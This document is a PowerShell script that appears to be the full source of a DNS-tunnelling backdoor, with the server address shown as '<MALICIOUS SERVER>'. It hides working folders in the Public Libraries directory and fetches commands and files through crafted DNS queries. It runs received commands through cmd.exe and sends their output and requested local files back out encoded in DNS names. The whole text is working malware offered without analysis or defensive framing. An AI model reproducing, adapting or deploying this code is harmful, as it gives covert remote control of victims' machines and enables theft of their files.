# version 2.3
$MMC = "<MALICIOUS SERVER>";
$NNC = $env:PUBLIC + "\Libraries";
if (-not (Test-Path $NNC)) { md $NNC; }
$OOC = $NNC + "\quid";

$PPC = $NNC + "\lock";
if (!(Test-Path $PPC)){sc -Path $PPC -Value $pid;}
else
{
	$QQC = (NEW-TIMESPAN -Start ((Get-ChildItem $PPC).CreationTime) -End (Get-Date)).Minutes
	if ($QQC -gt 10)
	{
		stop-process -id (gc $PPC);
		ri -Path $PPC;
	}
	return;
}

$RRC = get-content $OOC;
$SSC = Get-Random -InputObject (10 .. 99);
if ($RRC.length -ne 10) { $RRC = $SSC.ToString() + [guid]::NewGuid().toString().replace('-', '').substring(0, 8); $RRC | sc $OOC }
gi $OOC -Force | %{ $_.Attributes = "Hidden" }
${global:$TTC} = 0;

function UUC ($VVC, $WWC, $XXC, $YYC, $ZZC, $AAD)
{
	$BBD = -join ((48 .. 57)+(65 .. 70) | Get-Random  -Count (%{ Get-Random -InputObject (1 .. 7) }) | %{ [char]$_ });
	$CCD = Get-Random -InputObject (0 .. 9) -Count 2;
	$DDD = $RRC.Insert(($CCD[1]), $WWC).Insert($CCD[0], $VVC);
	if ($ZZC -eq "s")
	{ return "$($DDD)$($AAD)$($BBD)C$($CCD[0])$($CCD[1])T.$XXC.$YYC.$MMC"; }
	else 
	{ return "$($DDD)$($AAD)$($BBD)C$($CCD[0])$($CCD[1])T.$($MMC)";}
}

function EED()
{
	$FFD = $null;
	try
	{
		$FFD = ((Get-WmiObject Win32_NetworkAdapterConfiguration -ComputerName $env:computername -EA Stop | ? { $_.IPEnabled }).DNSServerSearchOrder)[0] | Out-String
	}
	catch [exception] {
		#Write-Host $_.Message
	}
	if (!$FFD)
	{
		try
		{
			$ns = nslookup.exe 8.8.8.8;
			$FFD = ($ns[1] -split ':')[1].Trim();
		}
		catch [exception] {
			#Write-Host $_.Message
		}
	}
	return $FFD
}

function GGD ($HHD)
{
	$ip = EED
	$ars = [system.net.IPAddress]::Parse([System.Net.Dns]::GetHostAddresses($MMC));
	$end = New-Object System.Net.IPEndPoint $ars, 53
	$s = New-Object System.Net.Sockets.UdpClient
	$s.Client.ReceiveTimeout = $s.Client.SendTimeout = 15000
	$s.Connect($end)
	$pre = (0xa4, 0xa3, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
	if (!$HHD.StartsWith('.')) { $HHD = "." + $HHD; }
	if (!$HHD.EndsWith('.')) { $HHD = $HHD + "."; }
	$mb = [System.Text.Encoding]::ASCII.GetBytes($HHD)
	$p = $HHD.Split('.')
	$pi = 1
	for ($i = 0; $i -lt $mb.length; $i++) { if ($mb[$i] -eq 0x2e) { $mb[$i] = $p[$pi].Length; $pi++ } }
	$pre += $mb
	$pre += (0x00, 0x10, 0x00, 0x01)
	$buf = $pre
	$Sent = $s.Send($buf, $buf.Length)
	$rb = $s.Receive([ref]$end)
	$r = [byte[]]( ,0x0 * ($rb.length - ($mb.length + 29)))
	[System.Buffer]::BlockCopy($rb, $mb.length + 29, $r, 0, ($rb.length - ($mb.length + 29)))
	return $r
}

function IID ($HHD)
{
	$ip = EED
	$ars = [system.net.IPAddress]::Parse([System.Net.Dns]::GetHostAddresses($MMC));
	$end = New-Object System.Net.IPEndPoint $ars, 53
	$s = New-Object System.Net.Sockets.UdpClient
	$s.Client.ReceiveTimeout = $s.Client.SendTimeout = 15000
	$s.Connect($end)
	$pre = (0xa4, 0xa3, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
	if (!$HHD.StartsWith('.')) { $HHD = "." + $HHD; }
	if (!$HHD.EndsWith('.')) { $HHD = $HHD + "."; }
	$mb = [System.Text.Encoding]::ASCII.GetBytes($HHD)
	$p = $HHD.Split('.')
	$pi = 1
	for ($i = 0; $i -lt $mb.length; $i++) { if ($mb[$i] -eq 0x2e) { $mb[$i] = $p[$pi].Length; $pi++ } }
	$pre += $mb
	$pre += (0x00, 0x01, 0x00, 0x01)
	$buf = $pre
	$Sent = $s.Send($buf, $buf.Length)
	$rb = $s.Receive([ref]$end)
	$r = [byte[]]( ,0x0 * ($rb.length - ($mb.length + 28)))
	[System.Buffer]::BlockCopy($rb, $mb.length + 28, $r, 0, ($rb.length - ($mb.length + 28)))
	return $r
}

function JJD
{
	$KKD = $false;
	$LLD = 0;
	$MMD = ${global:$NND} + "\";
	$OOD = @();
	$PPD = "000";
	$QQD = "0";
	${global:$RRD} = $true;
	${global:$SSD} = 0;
	${global:$$TTD} = 5;
	
	While (${global:$RRD})
	{
		Start-Sleep -m 50;
		if (${global:$SSD} -gt ${global:$$TTD}) { break }
		if ($LLD -eq [int]$PPD) { ${global:$SSD}++ }
		if ($LLD -lt 10) { $PPD = "00$($LLD)"; }
		elseif ($LLD -lt 100) { $PPD = "0$($LLD)"; }
		else { $PPD = "$($LLD)"; }
		$UUD = UUC $PPD $QQD "" "" "r"
		try
		{
			Write-Host $UUD;
			$VVD = [System.Net.Dns]::GetHostAddresses($UUD);
			Write-Host $VVD;
		}
		catch [Exception]
		{
			echo $_.Exception.GetType().FullName, $_.Exception.Message; Write-Host "excepton occured!"; ${global:$SSD}++; continue;
		}
		
		if ($VVD -eq $null)
		{
			${global:$SSD} = ${global:$SSD} + 1;
			continue;
		}
		$WWD = $VVD[0].IPAddressToString.Split('.');
		Write-Host "$($LLD):$($WWD[3])`tsaveing_mode: $($KKD)`t   $($WWD[0]) $($WWD[1]) $($WWD[2])"
		if (($WWD[0] -eq 1) -and ($WWD[1] -eq 2) -and ($WWD[2] -eq 3))
		{
			$KKD = $false;
			$QQD = "0";
			$len = $OOD.Length
			if ($OOD[$len - 1] -eq 0 -and $OOD[$len - 2] -eq 0)
			{
				$XXD = $OOD[0 .. ($len - 3)];
			}
			elseif ($OOD[$len - 1] -eq 0)
			{
				$XXD = $OOD[0 .. ($len - 2)];
			}
			else
			{
				$XXD = $OOD;
			}
			[System.IO.File]::WriteAllBytes($MMD, $XXD);
			$OOD = @();
			$XXD = @();
			$LLD = 0;
			${global:$RRD} = $false;
		}
		
		if ($KKD)
		{
			if ($LLD -gt 250) { $LLD = 0; }
			if ($LLD -eq $WWD[3])
			{
				$OOD += $WWD[0];
				$OOD += $WWD[1];
				$OOD += $WWD[2];
				$LLD = $LLD + 3;
			}
		}
		
		if (($WWD[0] -eq 24) -and ($WWD[1] -eq 125))
		{
			$MMD += "rcvd" + $WWD[2] + "" + $WWD[3];
			$KKD = $true;
			$QQD = "1";
			$LLD = 0;
		}
		
		if (($WWD[0] -eq 11) -and ($WWD[1] -eq 24) -and ($WWD[2] -eq 237) -and ($WWD[3] -eq 110)) # kill this process
		{
			${global:$RRD} = $false;
			${global:$SSD} = ${global:$SSD} + 1;
		}
	}
	Start-Sleep -s 1;
}

function YYD
{
	$byts = @(); $ct = 0; $fb = @(); $rn = "000"; $ZZD = "W"; $run = $true; $AAE = ${global:$NND} + "\";
	$BBE = 0;
	While ($run)
	{
		Start-Sleep -m 50;
		if ($BBE -gt 5){ $run = $false; }
		if ($ct -lt 10){$rn = "000$($ct)";}
		elseif ($ct -lt 100){$rn = "00$($ct)";}
		elseif ($ct -lt 1000){$rn = "0$($ct)";}
		else{$rn = "$($ct)";}
		try
		{
			$CCE = UUC "000" $ZZD "" "" "r" $rn
			$tmp = GGD($CCE);
			$res = [System.Text.Encoding]::ASCII.GetString($tmp);
		}
		catch [exception] { Write-Host $_; $BBE++; ${global:$TTC}++; continue; }
		if ([string]::IsNullOrEmpty($res)) { $BBE++; ${global:$TTC}++; continue;}
		$rs = $res.Split('>');
		$data = "";
		For ($i = 0; $i -le $rs[1].Length; $i++) { if ($rs[1][$i] -lt 125 -and $rs[1][$i] -gt 41) { $data += $rs[1][$i]; } }
		if ($rs[0][0] -eq "N")
		{
			$ZZD = "W";
			$BBE++;
			continue;
		}
		if ($rs[0] -eq "S000s")
		{
			$BBE = 0;
			$ZZD = "D";
			$AAE += ("rcvd"+$data);
			$ct = 0;
			continue;
		}
		if ($rs[0][0] -eq 'S' -and -not ($fb -contains $rs[0]))
		{
			$ZZD = "D";
			if ($rs[0].EndsWith($rn))
			{
				try
				{
					$tmp = $data.Replace('-', '+').Replace('_', '/');
					$byts += [System.Convert]::FromBase64String($tmp);
					$ct++;
					$fb += $rs[0];
				}
				catch
				{
					Write-Host "Exception in receiver_"+$_;
				}
			}
		}
		if ($rs[0].StartsWith("E"))
		{
			[System.IO.File]::WriteAllBytes($AAE, $byts);
			break;
		}
		if ($rs[0].StartsWith("C"))
		{
			$ct = 0; $run = $false;
		}
	}
}

function DDE($EEE)
{
	$LLD = 0;
	$FFE = @(gci -path (${global:$GGE}+"\proc*") | ? { !$_.PSIsContainer });
	if ($FFE -ne $null)
	{
		
		$HHE = $FFE[0].ToString().Substring($FFE[0].ToString().Length - 5)
		$IIE = ${global:$GGE} + "\" + $HHE;
		rni $FFE[0] $IIE -Force
		$JJE = slaber $IIE;
		if ([int]$JJE.Length -le 0) { rd -path $IIE;return; }
		$KKE = 60;
		$LLE = "*" * 54;
		$LLE = Split-path $IIE -Leaf | % { $LLE.Insert(0, $_) } | % { $_.Insert(6, $JJE.Length) } | %{ $_[0 .. 26] -join "" };
		$LLE = -join ($LLE | % { resolver $_ })
		$MME = "COCTab" + $LLE;
		$JJE = $MME + $JJE;
		$NNE = "000";
		$QQD = "2";
		$OOE = 0;
		$PPE = $true;
		${global:$RRD} = $true;
		$QQE = $true;
		${global:$SSD} = 0;
		${global:$TTD} = 5;
		
		While (${global:$RRD})
		{
			Start-Sleep -m 10;
			if (${global:$SSD} -gt ${global:$TTD})
			{
				$RRE = ${global:$GGE} + "\proc" + $HHE;
				rni $IIE $RRE -Force;
				break;
			}
			
			if ($LLD -lt 10) { $NNE = "00$($LLD)"; }
			elseif ($LLD -lt 100) { $NNE = "0$($LLD)"; }
			else { $NNE = "$($LLD)"; }
			
			if ($LLD -eq 250)
			{
				if ($PPE)
				{
					$OOE += 250;
				}
				$LLD = 0; $PPE = $false;
			}
			if ($LLD -eq 200) { $PPE = $true; }
			
			if ($JJE.Length -gt $KKE)
			{
				if (($JJE.Length - $KKE * ($LLD + $OOE)) -ge $KKE)
				{
					$SSE = $JJE.Substring($KKE * ($LLD + $OOE), $KKE);
				}
				elseif (($JJE.Length - $KKE * ($LLD + $OOE)) -gt 0)
				{
					$SSE = $JJE.Substring($KKE * ($LLD + $OOE), ($JJE.Length - $KKE * ($LLD + $OOE)));
				}
				else
				{
					$SSE = "COCTabCOCT";
					${global:$RRD} = $false;
					rd -path $IIE -Force;
				}
			}
			else
			{
				$SSE = $JJE;
			}
			$TTE = (Split-path $IIE -Leaf) + "*" | % { resolver $_ };
			$UUD = UUC $NNE $QQD $SSE $TTE "s" "0000"
			try
			{
				if ($EEE -lt 3 -and -not ($UUE))
				{
					$VVD = IID($UUD);
				}
				else
				{
					$VVD = [System.Net.Dns]::GetHostAddresses($UUD);
					$VVD = $VVD.IPAddressToString.Split('.')
				}
				Write-Host $VVD;
			}
			catch [exception] { Write-Host "excepton occured!"+$_; ${global:$SSD}++; continue; }
			
			if ($VVD -eq $null) { $QQE = $false; ${global:$SSD}++; continue }

			if (($VVD[0] -eq $RRC.Substring(0,2)) -and ($VVD[1] -eq 2) -and ($VVD[2] -eq 3))
			{
				$QQE = $false;
				$LLD = [int]$VVD[3];
			}
			
			if (($VVD[0] -eq 253) -and ($VVD[1] -eq 25) -and ($VVD[2] -eq 42) -and ($VVD[3] -eq 87)) # kill this process
			{
				$QQE = $false;
				$OOE = 0
				${global:$RRD} = $false;
				${global:$SSD} = ${global:$SSD} + 3;
				del $IIE;
			}
			
			if ($QQE)
			{
				${global:$SSD}++;
			}
		}
	}
}
function slaber ($VVE) {
	$f = gc $VVE -Encoding Byte;
	$e = resolver($f);
	return $e;
}
function resolver ($WWE) {
	$cnt = 0;
	$p1 = "";
	$p2 = "";
	for ($i = 0; $i -lt $WWE.Length; $i++)
	{
		if ($cnt -eq 30)
		{
			$cnt = 0;
			$res += ($p1 + $p2);
			$p1 = ""; $p2 = "";
		}
		$tmp = [System.BitConverter]::ToString($WWE[$i]).Replace("-", "");
		$p1 += $tmp[0];
		$p2 += $tmp[1];
		$cnt++;
	}
	$res += ($p1 + $p2);
	return $res;
}
function XXE
{
	$FFE = @(gci -path (${global:$NND}+"\rcvd*") | ? { !$_.PSIsContainer });
	if ($FFE -ne $null)
	{
		$IIE = $FFE[0].ToString().Replace("rcvd", "proc")
		rni $FFE[0] $IIE -Force
		$YYE = $IIE -replace "receivebox", "sendbox";
		if ($IIE.EndsWith("0"))
		{
			$ZZE = gc $IIE | ? { $_.trim() -ne "" };
			$ZZE = $ZZE | ? { $_.trim() -ne "" }
			$AAF += ($ZZE + " 2>&1") | % {Try { $_ | cmd.exe | Out-String }Catch { $_ | Out-String }}
			$AAF +"<>" | sc $YYE -Encoding UTF8
			if (Test-path -path $IIE)
			{
				rd -path $IIE;
			}
		}
		elseif ($IIE.EndsWith("1"))
		{
			$BBF = gc $IIE | ? { $_.trim() -ne "" } | %{ $_.Replace("`0", "").Trim() }
			if (Test-path -path $BBF)
			{
				cpi -path $BBF -destination $YYE -Force;
			}
			else
			{
				"File not exist" | sc $YYE;
			}
			if (Test-path -path $IIE)
			{
				rd -path $IIE;
			}
		}
		else {
			$CCF = $IIE -replace "receivebox", "done";
			mi -path $IIE -destination $CCF -Force;
			if (Test-path -path $CCF)
			{
				("200<>" + $CCF) | sc $YYE;
				rd -path $IIE;
			}
		}
		try
		{
			rd -path $IIE;
		}catch{}
	}
}

${global:$DDF} = $NNC + "\" + $RRC;
${global:$EEF} = $NNC + "\files";
${global:$NND} = ${global:$DDF} + "\receivebox";
${global:$GGE} = ${global:$DDF} + "\sendbox";
${global:$FFF} = ${global:$DDF} + "\done";

if (-not (Test-Path ${global:$EEF})) { md ${global:$EEF}; }
if (-not (Test-Path ${global:$DDF}) -or -not (Test-Path ${global:$GGE}))
{
	md ${global:$DDF};
	md ${global:$GGE};
	md ${global:$NND};
	md ${global:$FFF};
}
$GGF = UUC "000" "M" "" "" "r" $rn
$HHF = [System.Net.Dns]::GetHostAddresses($GGF);
$UUE = $false;
if ($HHF -eq "99.250.250.199")
{
	${global:$TTC} = 0;
	YYD;
	if (${global:$TTC} -gt 3)
	{
		$UUE = $true;
		$IIF = UUC "000" "P" "" "" "r" $rn
		[System.Net.Dns]::GetHostAddresses($IIF);
		JJD;
	}
}
else
{
	$UUE = $true;
	JJD;
}
XXE;
DDE(${global:$TTC});
# remove lock file to next request
ri -Path $PPC;
